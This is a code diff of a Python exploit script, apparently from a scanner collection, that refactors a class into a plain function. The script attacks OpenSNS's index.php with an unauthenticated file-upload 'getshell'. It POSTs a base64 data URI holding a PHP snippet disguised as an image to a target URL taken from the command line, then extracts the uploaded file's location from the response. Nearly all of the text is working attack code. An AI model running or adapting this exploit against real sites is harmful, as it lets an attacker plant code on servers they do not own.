@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-  
-
-class index_getshell:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['opensns index.php 前台getshell','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -26,7 +19,7 @@ class index_getshell:
         post_data = {
             "data":"data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             pos = req.text.find("http:")
@@ -44,5 +37,4 @@ class index_getshell:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = index_getshell(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
